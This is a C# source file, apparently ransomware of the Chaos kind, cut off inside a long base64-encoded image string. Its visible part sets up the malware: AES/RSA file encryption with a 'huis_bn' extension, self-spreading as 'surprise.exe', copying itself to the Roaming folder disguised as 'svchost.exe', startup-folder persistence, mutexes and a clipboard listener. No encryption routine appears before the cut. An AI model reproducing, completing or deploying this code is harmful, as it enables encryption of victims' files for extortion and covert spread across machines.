using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "huis_bn";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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